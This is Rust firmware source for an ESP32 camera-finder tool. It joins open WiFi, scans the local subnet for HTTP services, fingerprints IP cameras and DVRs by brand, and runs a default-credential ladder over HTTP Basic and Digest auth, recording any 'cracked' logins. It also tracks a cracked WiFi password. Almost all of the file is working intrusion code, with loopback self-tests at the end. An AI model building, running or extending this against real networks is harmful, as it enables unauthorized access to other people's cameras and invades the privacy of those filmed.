//! Camera Finder (Tier 3 / CCTV swiss-knife build #2): join an OPEN WiFi network,
//! pull a DHCP lease, then sweep the local `/24` for hosts exposing an HTTP web
//! UI and fingerprint each one (`Server:` + `WWW-Authenticate:` realm + status)
//! to flag likely IP cameras / DVRs.
//!
//! Unlike [`crate::radio::netscan`] (one host, many ports, sequential), this scans
//! MANY hosts on a couple of web ports, so it runs the connect-probe **concurrently**
//! across a pool of TCP sockets — otherwise an all-dead `/24` (each dead IP costs an
//! ARP-resolution timeout) would take minutes. Live HTTP endpoints are then
//! fingerprinted one at a time with the shared [`crate::radio::http`] client.
//!

use alloc::vec;
use alloc::vec::Vec;

use smoltcp::iface::{Config, Interface, SocketHandle, SocketSet, SocketStorage};
use smoltcp::socket::{dhcpv4, tcp};
use smoltcp::time::Instant as SmolInstant;
use smoltcp::wire::{EthernetAddress, HardwareAddress, IpCidr, Ipv4Address};

use esp_hal::time::{Duration, Instant};
use esp_radio::wifi::Interface as WifiIface;

use crate::radio::portal::WifiPhy;

/// Web ports probed on every host in the subnet (plaintext HTTP only — no TLS).
pub const PORTS: [u16; 2] = [80, 8080];
/// Concurrent connect-probe sockets.
const POOL: usize = 16;
/// Caps to bound RAM + time on a busy network.
const MAX_LIVE: usize = 64;
const MAX_HOSTS: usize = 48;

/// One fingerprinted host:port.
#[derive(Clone)]
pub struct CamHost {
    pub ip: [u8; 4],
    pub port: u16,
    pub status: u16,
    pub server: [u8; 48],
    pub server_len: usize,
    pub is_camera: bool,
    pub brand: &'static str,
    /// The host issued an HTTP Basic 401 (so the Basic cred ladder ran).
    pub auth_basic: bool,
    /// The host issued an HTTP Digest 401 (so the Digest cred ladder ran).
    pub auth_digest: bool,
    /// A working default credential `user:pass`, if one was found.
    pub cred: [u8; 24],
    pub cred_len: usize,
}
impl CamHost {
    fn new() -> Self {
        Self {
            ip: [0; 4],
            port: 0,
            status: 0,
            server: [0; 48],
            server_len: 0,
            is_camera: false,
            brand: "",
            auth_basic: false,
            auth_digest: false,
            cred: [0; 24],
            cred_len: 0,
        }
    }
    /// The grabbed `Server:` banner. Used by the selftest dump + (later) build #4
    /// brand-specific snapshot paths; the radar UI shows brand/cred instead.
    #[allow(dead_code)]
    pub fn server_str(&self) -> &str {
        core::str::from_utf8(&self.server[..self.server_len]).unwrap_or("")
    }
    /// The cracked `user:pass`, or "" if none found.
    pub fn cred_str(&self) -> &str {
        core::str::from_utf8(&self.cred[..self.cred_len]).unwrap_or("")
    }
}

pub struct CamResult {
    pub got_ip: bool,
    pub ip: [u8; 4],
    pub gw: [u8; 4],
    pub total: usize,  // total (host,port) probes queued
    pub probed: usize, // probes completed
    pub live: usize,   // HTTP-open endpoints found
    pub hosts: Vec<CamHost>,
    pub phase: &'static str,
    /// Cracked WiFi password (if the joined AP was encrypted), else empty.
    pub wifi_pass: [u8; 24],
    pub wifi_pass_len: usize,
}
impl CamResult {
    pub fn new() -> Self {
        Self {
            got_ip: false,
            ip: [0; 4],
            gw: [0; 4],
            total: 0,
            probed: 0,
            live: 0,
            hosts: Vec::new(),
            phase: "join",
            wifi_pass: [0; 24],
            wifi_pass_len: 0,
        }
    }
    pub fn set_wifi_pass(&mut self, p: &str) {
        let b = p.as_bytes();
        let n = b.len().min(self.wifi_pass.len());
        self.wifi_pass[..n].copy_from_slice(&b[..n]);
        self.wifi_pass_len = n;
    }
    pub fn wifi_pass_str(&self) -> &str {
        core::str::from_utf8(&self.wifi_pass[..self.wifi_pass_len]).unwrap_or("")
    }
    pub fn cam_count(&self) -> usize {
        self.hosts.iter().filter(|h| h.is_camera).count()
    }
    pub fn cracked_count(&self) -> usize {
        self.hosts.iter().filter(|h| h.cred_len > 0).count()
    }
}

/// Common default camera/DVR credentials, tried in order via HTTP Basic auth.
pub const CREDS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", ""),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "admin12345"),
    ("admin", "9999"),
    ("admin", "1111"),
    ("admin", "1234"),
    ("admin", "4321"),
    ("admin", "meinsm"),
    ("root", "root"),
    ("root", "admin"),
    ("root", "12345"),
    ("root", "pass"),
    ("root", "888888"),
    ("service", "service"),
    ("supervisor", "supervisor"),
    ("guest", "guest"),
    ("user", "user"),
];

/// Drive the sweep on an already-associated STA `iface`. `tick(&CamResult)` is
/// called periodically so the caller can repaint + poll for an abort key.
///
/// `#[inline(never)]`: this is a big one-shot body; keeping it out of `main`
/// stops `main`'s `.text` from overflowing the Xtensa l32r literal range.
#[inline(never)]
pub fn sweep(iface_sta: WifiIface<'static>, mac: [u8; 6], mut tick: impl FnMut(&CamResult) -> bool) -> CamResult {
    let mut device = WifiPhy::new(iface_sta);
    let t0 = Instant::now();
    let now = || SmolInstant::from_millis(t0.elapsed().as_millis() as i64);

    let mut cfg = Config::new(HardwareAddress::Ethernet(EthernetAddress(mac)));
    cfg.random_seed = t0.duration_since_epoch().as_micros() | 1;
    let mut iface = Interface::new(cfg, &mut device, now());

    // socket buffers (heap, to keep the task stack small): POOL tiny probe sockets
    // + one bigger fingerprint socket. The probe only needs to reach Established,
    // so 64 B buffers are plenty.
    let mut rx_pool = vec![0u8; POOL * 64];
    let mut tx_pool = vec![0u8; POOL * 64];
    let mut f_rx = vec![0u8; 512];
    let mut f_tx = vec![0u8; 768]; // room for a full Digest Authorization header
    let mut rxc: Vec<&mut [u8]> = rx_pool.chunks_mut(64).collect();
    let mut txc: Vec<&mut [u8]> = tx_pool.chunks_mut(64).collect();

    let mut storage = [SocketStorage::EMPTY; POOL + 2];
    let mut sockets = SocketSet::new(&mut storage[..]);
    let dhcp_h = sockets.add(dhcpv4::Socket::new());

    let mut res = CamResult::new();

    // ---- phase 1: DHCP lease (up to 12 s) ----
    res.phase = "dhcp";
    loop {
        iface.poll(now(), &mut device, &mut sockets);
        if let Some(dhcpv4::Event::Configured(c)) = sockets.get_mut::<dhcpv4::Socket>(dhcp_h).poll() {
            iface.update_ip_addrs(|a| {
                a.clear();
                let _ = a.push(IpCidr::Ipv4(c.address));
            });
            res.got_ip = true;
            res.ip = c.address.address().octets();
            if let Some(r) = c.router {
                let _ = iface.routes_mut().add_default_ipv4_route(r);
                res.gw = r.octets();
            }
            break;
        }
        if !tick(&res) {
            return res;
        }
        if t0.elapsed() >= Duration::from_secs(12) {
            res.phase = "no lease";
            return res;
        }
    }

    // probe + fingerprint sockets (added after the lease so they don't churn during DHCP)
    let mut probe_h: Vec<SocketHandle> = Vec::with_capacity(POOL);
    for _ in 0..POOL {
        let r = rxc.pop().unwrap();
        let t = txc.pop().unwrap();
        probe_h.push(sockets.add(tcp::Socket::new(tcp::SocketBuffer::new(r), tcp::SocketBuffer::new(t))));
    }
    let fp_h = sockets.add(tcp::Socket::new(
        tcp::SocketBuffer::new(&mut f_rx[..]),
        tcp::SocketBuffer::new(&mut f_tx[..]),
    ));

    // target list: every host in our /24 (skip ourselves) x web ports
    let mut targets: Vec<(Ipv4Address, u16)> = Vec::new();
    for x in 1u8..=254 {
        if x == res.ip[3] {
            continue;
        }
        let ip = Ipv4Address::new(res.ip[0], res.ip[1], res.ip[2], x);
        for &p in &PORTS {
            targets.push((ip, p));
        }
    }
    res.total = targets.len();

    // ---- phase 2: concurrent connect-probe (engine extracted + loopback-tested) ----
    res.phase = "probe";
    let (live, probed, aborted) = probe_concurrent(
        &mut iface,
        &mut device,
        &mut sockets,
        &probe_h,
        &targets,
        &now,
        |p, l| {
            res.probed = p;
            res.live = l;
            tick(&res)
        },
    );
    res.probed = probed;
    res.live = live.len();
    if aborted {
        return res;
    }

    // ---- phase 3: fingerprint each live HTTP endpoint ----
    res.phase = "fingerprint";
    let mut fp_lport: u16 = 60000;
    for (ip, port) in live.iter().copied() {
        if res.hosts.len() >= MAX_HOSTS {
            break;
        }
        let r = crate::radio::http::http_head(
            &mut iface, &mut device, &mut sockets, fp_h, ip, port, "/", None, fp_lport, &now,
        );
        fp_lport = if fp_lport >= 64000 { 60000 } else { fp_lport + 1 };
        let (is_camera, brand) = classify(r.server_str(), r.www_auth_str(), r.status);
        let mut host = CamHost::new();
        host.ip = ip.octets();
        host.port = port;
        host.status = r.status;
        host.is_camera = is_camera;
        host.brand = brand;
        // pick the cred-ladder path from the challenge scheme
        host.auth_digest = r.status == 401 && ci_has(r.www_auth_str(), "digest");
        host.auth_basic = r.status == 401 && !host.auth_digest;
        let take = core::cmp::min(r.server_len, host.server.len());
        host.server[..take].copy_from_slice(&r.server[..take]);
        host.server_len = take;
        res.hosts.push(host);
        if !tick(&res) {
            break;
        }
    }

    // ---- phase 4: default-credential ladder (HTTP Basic, on 401 hosts) ----
    res.phase = "creds";
    let mut cred_lport: u16 = 61000;
    for hi in 0..res.hosts.len() {
        let (basic, digest, ip4, port) = {
            let h = &res.hosts[hi];
            (h.auth_basic, h.auth_digest, h.ip, h.port)
        };
        if !basic && !digest {
            continue;
        }
        let ip = Ipv4Address::new(ip4[0], ip4[1], ip4[2], ip4[3]);

        if basic {
            for &(user, pass) in CREDS {
                let mut tok = [0u8; 64];
                let n = b64_userpass(user, pass, &mut tok);
                let mut hdr = [0u8; 72];
                hdr[..6].copy_from_slice(b"Basic ");
                hdr[6..6 + n].copy_from_slice(&tok[..n]);
                let auth = core::str::from_utf8(&hdr[..6 + n]).unwrap_or("");
                let r = crate::radio::http::http_head(
                    &mut iface, &mut device, &mut sockets, fp_h, ip, port, "/", Some(auth), cred_lport, &now,
                );
                cred_lport = if cred_lport >= 64000 { 61000 } else { cred_lport + 1 };
                if r.connected && (200..400).contains(&r.status) {
                    store_cred(&mut res.hosts[hi], user, pass);
                    break;
                }
                if !tick(&res) {
                    res.phase = "done";
                    return res;
                }
            }
        } else {
            // Digest: fetch a fresh 401 to read the challenge (nonce), then try creds
            let probe = crate::radio::http::http_head(
                &mut iface, &mut device, &mut sockets, fp_h, ip, port, "/", None, cred_lport, &now,
            );
            cred_lport = if cred_lport >= 64000 { 61000 } else { cred_lport + 1 };
            let ch = crate::radio::digest::parse_challenge(probe.www_auth_str());
            if ch.is_digest && ch.nonce_len > 0 {
                for &(user, pass) in CREDS {
                    let mut resp = [0u8; 32];
                    crate::radio::digest::response_hex(
                        user, ch.realm_str(), pass, "GET", "/", ch.nonce_str(), ch.qop_auth,
                        "00000001", "0a4f113b", &mut resp,
                    );
                    let resps = core::str::from_utf8(&resp).unwrap_or("");
                    let opaque = if ch.opaque_len > 0 { Some(ch.opaque_str()) } else { None };
                    let mut hdr = [0u8; 512];
                    let hn = crate::radio::digest::build_header(
                        user, ch.realm_str(), ch.nonce_str(), "/", resps, opaque, ch.qop_auth,
                        "00000001", "0a4f113b", &mut hdr,
                    );
                    let auth = core::str::from_utf8(&hdr[..hn]).unwrap_or("");
                    let r = crate::radio::http::http_head(
                        &mut iface, &mut device, &mut sockets, fp_h, ip, port, "/", Some(auth), cred_lport, &now,
                    );
                    cred_lport = if cred_lport >= 64000 { 61000 } else { cred_lport + 1 };
                    if r.connected && (200..400).contains(&r.status) {
                        store_cred(&mut res.hosts[hi], user, pass);
                        break;
                    }
                    if !tick(&res) {
                        res.phase = "done";
                        return res;
                    }
                }
            }
        }
    }

    res.phase = "done";
    res
}

/// Record a working `user:pass` into a host's cred buffer (truncating to fit).
fn store_cred(h: &mut CamHost, user: &str, pass: &str) {
    let mut n = 0usize;
    for &b in user.as_bytes() {
        if n < h.cred.len() {
            h.cred[n] = b;
            n += 1;
        }
    }
    if n < h.cred.len() {
        h.cred[n] = b':';
        n += 1;
    }
    for &b in pass.as_bytes() {
        if n < h.cred.len() {
            h.cred[n] = b;
            n += 1;
        }
    }
    h.cred_len = n;
}

/// The concurrent connect-probe engine, split out of [`sweep`] so it is generic
/// over the smoltcp device (real `WifiPhy` in production, `Loopback` in tests).
/// Cycles `targets` through a fixed pool of TCP sockets, classifying each as
/// open (Established → pushed to the returned list), closed (RST), or dead
/// (no answer within the timeout). `progress(probed, live)` is called each poll
/// for repaint/abort; returning `false` stops early. Returns
/// `(live_endpoints, probed_count, aborted)`.
fn probe_concurrent<D, F>(
    iface: &mut Interface,
    device: &mut D,
    sockets: &mut SocketSet<'_>,
    probe_h: &[SocketHandle],
    targets: &[(Ipv4Address, u16)],
    now: &dyn Fn() -> SmolInstant,
    mut progress: F,
) -> (Vec<(Ipv4Address, u16)>, usize, bool)
where
    D: smoltcp::phy::Device,
    F: FnMut(usize, usize) -> bool,
{
    let pool = probe_h.len();
    let mut live: Vec<(Ipv4Address, u16)> = Vec::new();
    let mut slot: Vec<Option<(usize, Instant)>> = vec![None; pool];
    let mut next = 0usize;
    let mut probed = 0usize;
    let mut lport: u16 = 40000;
    let t0 = Instant::now();
    let mut aborted = false;
    loop {
        // hand idle slots their next target
        for i in 0..pool {
            if slot[i].is_none() && next < targets.len() {
                let (ip, port) = targets[next];
                let lp = lport;
                lport = if lport >= 64000 { 40000 } else { lport + 1 };
                {
                    let cx = iface.context();
                    let s = sockets.get_mut::<tcp::Socket>(probe_h[i]);
                    s.abort();
                    let _ = s.connect(cx, (ip, port), lp);
                }
                slot[i] = Some((next, Instant::now()));
                next += 1;
            }
        }

        iface.poll(now(), device, sockets);

        // harvest finished slots
        for i in 0..pool {
            if let Some((ti, started)) = slot[i] {
                let st = sockets.get_mut::<tcp::Socket>(probe_h[i]).state();
                let finished = match st {
                    tcp::State::Established => {
                        if live.len() < MAX_LIVE {
                            live.push(targets[ti]);
                        }
                        sockets.get_mut::<tcp::Socket>(probe_h[i]).abort();
                        true
                    }
                    // RST = host is up but this port is closed (not interesting here)
                    tcp::State::Closed if started.elapsed() >= Duration::from_millis(60) => true,
                    // no SYN-ACK / ARP never resolved = dead or filtered
                    _ if started.elapsed() >= Duration::from_millis(450) => {
                        sockets.get_mut::<tcp::Socket>(probe_h[i]).abort();
                        true
                    }
                    _ => false,
                };
                if finished {
                    slot[i] = None;
                    probed += 1;
                }
            }
        }

        if next >= targets.len() && slot.iter().all(Option::is_none) {
            break;
        }
        if t0.elapsed() >= Duration::from_secs(60) {
            break; // safety bound
        }
        if !progress(probed, live.len()) {
            aborted = true;
            break;
        }
    }
    (live, probed, aborted)
}

// ------------------------------ classification -----------------------------

/// Classify an HTTP fingerprint as a likely camera/DVR. Returns
/// `(is_camera, brand_label)`. Heuristics over the `Server:` header, the
/// `WWW-Authenticate:` realm, and the status code — the same signals Shodan /
/// camera scanners key on. Pure function → unit-tested by `networktest`.
pub fn classify(server: &str, www_auth: &str, status: u16) -> (bool, &'static str) {
    let s = server;
    let w = www_auth;
    // strong brand signals (Server header or realm)
    if ci_has(s, "hikvision") || ci_has(s, "app-webs") || ci_has(s, "dnvrs") || ci_has(w, "hikvision") {
        return (true, "Hikvision");
    }
    if ci_has(s, "dahua") || ci_has(w, "dahua") {
        return (true, "Dahua");
    }
    if ci_has(s, "axis") {
        return (true, "Axis");
    }
    if ci_has(s, "reolink") || ci_has(w, "reolink") {
        return (true, "Reolink");
    }
    if ci_has(s, "uc-httpd") {
        return (true, "Xiongmai/uc-httpd");
    }
    if ci_has(s, "goahead") {
        return (true, "GoAhead cam");
    }
    if ci_has(s, "boa") {
        return (true, "Boa embedded");
    }
    if ci_has(s, "thttpd") {
        return (true, "thttpd embedded");
    }
    // NOTE: no bare "webs" check — it matches the ubiquitous "Webserver" banner on
    // consumer routers (false positive). GoAhead's "GoAhead-Webs" and Hikvision's
    // "App-webs" are already caught above; a bare "Server: Webs" cam still trips the
    // realm branch below when it sends a camera login challenge.
    // realm-based hints
    if ci_has(w, "ipcamera") || ci_has(w, "ip camera") || ci_has(w, "netsurveillance")
        || ci_has(w, "dvr") || ci_has(w, "nvr") || ci_has(w, "camera")
    {
        return (true, "camera (realm)");
    }
    // weak: a 401 challenge from a tiny embedded HTTP daemon
    if status == 401 && (ci_has(s, "mini_httpd") || ci_has(s, "lighttpd") || ci_has(s, "micro_httpd")) {
        return (true, "device login?");
    }
    (false, "")
}

/// ASCII case-insensitive substring search. `needle` must be lowercase.
fn ci_has(hay: &str, needle: &str) -> bool {
    let h = hay.as_bytes();
    let n = needle.as_bytes();
    if n.is_empty() {
        return true;
    }
    if h.len() < n.len() {
        return false;
    }
    'outer: for i in 0..=h.len() - n.len() {
        for j in 0..n.len() {
            if h[i + j].to_ascii_lowercase() != n[j] {
                continue 'outer;
            }
        }
        return true;
    }
    false
}

/// Base64-encode `user:pass` into `out` (the token an HTTP `Authorization: Basic`
/// header carries). Returns the encoded length. Standard alphabet + padding.
fn b64_userpass(user: &str, pass: &str, out: &mut [u8]) -> usize {
    const A: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    // assemble "user:pass" into a small scratch buffer
    let mut raw = [0u8; 48];
    let mut n = 0;
    for &b in user.as_bytes() {
        if n < raw.len() {
            raw[n] = b;
            n += 1;
        }
    }
    if n < raw.len() {
        raw[n] = b':';
        n += 1;
    }
    for &b in pass.as_bytes() {
        if n < raw.len() {
            raw[n] = b;
            n += 1;
        }
    }
    // base64 the first n bytes
    let mut o = 0;
    let mut i = 0;
    while i + 3 <= n {
        let x = ((raw[i] as u32) << 16) | ((raw[i + 1] as u32) << 8) | (raw[i + 2] as u32);
        if o + 4 <= out.len() {
            out[o] = A[(x >> 18 & 63) as usize];
            out[o + 1] = A[(x >> 12 & 63) as usize];
            out[o + 2] = A[(x >> 6 & 63) as usize];
            out[o + 3] = A[(x & 63) as usize];
            o += 4;
        }
        i += 3;
    }
    match n - i {
        1 => {
            let x = (raw[i] as u32) << 16;
            if o + 4 <= out.len() {
                out[o] = A[(x >> 18 & 63) as usize];
                out[o + 1] = A[(x >> 12 & 63) as usize];
                out[o + 2] = b'=';
                out[o + 3] = b'=';
                o += 4;
            }
        }
        2 => {
            let x = ((raw[i] as u32) << 16) | ((raw[i + 1] as u32) << 8);
            if o + 4 <= out.len() {
                out[o] = A[(x >> 18 & 63) as usize];
                out[o + 1] = A[(x >> 12 & 63) as usize];
                out[o + 2] = A[(x >> 6 & 63) as usize];
                out[o + 3] = b'=';
                o += 4;
            }
        }
        _ => {}
    }
    o
}

// --------------------------------- self-test --------------------------------

/// Full camscan self-test (run by the `networktest` build): the classifier
/// against canned fingerprints + the concurrent probe engine over a smoltcp
/// loopback (a temp in-firmware server). Together with the HTTP-core loopback
/// round-trip in [`crate::radio::http`], this covers the entire sweep pipeline
/// on-device with NO real network — only the WiFi radio association/DHCP wrapper
/// (shared verbatim with the field-proven `netscan`) needs a real AP.
///
/// `#[inline(never)]`: keeps this diagnostic body out of the giant `main`, whose
/// `.text` would otherwise overflow the Xtensa l32r literal range when linked.
#[cfg(feature = "networktest")]
#[inline(never)]
pub fn networktest() {
    classify_selftest();
    b64_selftest();
    crate::radio::digest::selftest();
    probe_loopback_test();
}

#[cfg(feature = "networktest")]
fn b64_selftest() {
    use esp_println::println;
    println!("[*] base64 auth encoder (no network)...");
    // (user, pass, expected base64 of "user:pass")
    let cases: &[(&str, &str, &str)] = &[
        ("admin", "admin", "YWRtaW46YWRtaW4="),
        ("admin", "", "YWRtaW46"),
        ("user", "pass", "dXNlcjpwYXNz"),
        ("Aladdin", "open sesame", "QWxhZGRpbjpvcGVuIHNlc2FtZQ=="),
        ("admin", "12345", "YWRtaW46MTIzNDU="),
    ];
    let mut pass = 0u32;
    let mut fail = 0u32;
    for (i, (u, p, want)) in cases.iter().enumerate() {
        let mut out = [0u8; 64];
        let n = b64_userpass(u, p, &mut out);
        let got = core::str::from_utf8(&out[..n]).unwrap_or("");
        if got == *want {
            pass += 1;
        } else {
            fail += 1;
            println!("    FAIL #{i}: got {got:?} want {want:?}");
        }
    }
    println!("    base64: {pass} pass, {fail} fail");
}

#[cfg(feature = "networktest")]
fn classify_selftest() {
    use esp_println::println;
    println!("[*] camera classifier (no network)...");
    // (server, www_auth, status, want_is_camera, want_brand)
    let cases: &[(&str, &str, u16, bool, &str)] = &[
        ("App-webs/", "Digest realm=\"IPCamera\"", 401, true, "Hikvision"),
        ("Hikvision-Webs", "", 200, true, "Hikvision"),
        ("Dahua Rtsp Server", "", 200, true, "Dahua"),
        ("GoAhead-Webs", "", 401, true, "GoAhead cam"),
        ("uc-httpd 1.0.0", "", 200, true, "Xiongmai/uc-httpd"),
        ("Boa/0.94.14rc21", "", 200, true, "Boa embedded"),
        ("thttpd/2.25b", "", 200, true, "thttpd embedded"),
        ("Router Webserver", "Basic realm=\"NETSURVEILLANCE\"", 401, true, "camera (realm)"),
        ("lighttpd/1.4.35", "Basic realm=\"login\"", 401, true, "device login?"),
        ("nginx/1.18.0", "", 200, false, ""),
        ("Apache/2.4.41 (Ubuntu)", "", 200, false, ""),
        ("Microsoft-IIS/10.0", "", 401, false, ""),
    ];
    let mut pass = 0u32;
    let mut fail = 0u32;
    for (i, (s, w, st, wcam, wbrand)) in cases.iter().enumerate() {
        let (cam, brand) = classify(s, w, *st);
        if cam == *wcam && brand == *wbrand {
            pass += 1;
        } else {
            fail += 1;
            println!("    FAIL #{i}: got ({cam},{brand:?}) want ({wcam},{wbrand:?})  [{s:?}/{w:?}]");
        }
    }
    println!("    classifier: {pass} pass, {fail} fail");
}

/// Exercise the real [`probe_concurrent`] engine over a smoltcp loopback: a temp
/// server listens on :80, and the probe is fed three targets that hit all three
/// outcomes — open (server :80), closed (RST on :8080), dead (an in-subnet IP no
/// host answers, ARP never resolves). No WiFi.
#[cfg(feature = "networktest")]
fn probe_loopback_test() {
    use esp_println::println;
    use smoltcp::phy::{Loopback, Medium};
    use smoltcp::wire::Ipv4Cidr;

    println!("[*] concurrent probe engine (loopback, no WiFi)...");

    let mut dev = Loopback::new(Medium::Ethernet);
    let t0 = Instant::now();
    let now = || SmolInstant::from_millis(t0.elapsed().as_millis() as i64);

    let mut cfg = Config::new(HardwareAddress::Ethernet(EthernetAddress([0x02, 0, 0, 0, 0, 9])));
    cfg.random_seed = 0xBEEF_0007;
    let mut iface = Interface::new(cfg, &mut dev, now());
    let host = Ipv4Address::new(192, 168, 69, 1);
    iface.update_ip_addrs(|a| {
        let _ = a.push(IpCidr::Ipv4(Ipv4Cidr::new(host, 24)));
    });

    // temp server on :80 + the probe socket pool
    let mut s_rx = [0u8; 128];
    let mut s_tx = [0u8; 128];
    let mut rx_pool = vec![0u8; POOL * 64];
    let mut tx_pool = vec![0u8; POOL * 64];
    let mut rxc: Vec<&mut [u8]> = rx_pool.chunks_mut(64).collect();
    let mut txc: Vec<&mut [u8]> = tx_pool.chunks_mut(64).collect();

    let mut storage = [SocketStorage::EMPTY; POOL + 1];
    let mut sockets = SocketSet::new(&mut storage[..]);
    let sh = sockets.add(tcp::Socket::new(
        tcp::SocketBuffer::new(&mut s_rx[..]),
        tcp::SocketBuffer::new(&mut s_tx[..]),
    ));
    if sockets.get_mut::<tcp::Socket>(sh).listen(80).is_err() {
        println!("    FAIL  server listen");
        return;
    }
    let mut probe_h: Vec<SocketHandle> = Vec::with_capacity(POOL);
    for _ in 0..POOL {
        let r = rxc.pop().unwrap();
        let t = txc.pop().unwrap();
        probe_h.push(sockets.add(tcp::Socket::new(tcp::SocketBuffer::new(r), tcp::SocketBuffer::new(t))));
    }

    let targets = [
        (host, 80u16),                               // open  -> live
        (host, 8080u16),                             // closed (RST)
        (Ipv4Address::new(192, 168, 69, 50), 80u16), // dead (ARP never resolves)
    ];

    let (live, probed, _aborted) =
        probe_concurrent(&mut iface, &mut dev, &mut sockets, &probe_h, &targets, &now, |_p, _l| true);

    if probed == 3 && live.len() == 1 && live[0] == (host, 80) {
        println!("    probe engine: OK  probed=3 live=1 (192.168.69.1:80; closed+dead rejected)");
    } else {
        println!("    probe engine: FAIL  probed={probed} live={}", live.len());
        for (ip, p) in &live {
            let o = ip.octets();
            println!("      live {}.{}.{}.{}:{}", o[0], o[1], o[2], o[3], p);
        }
    }
}
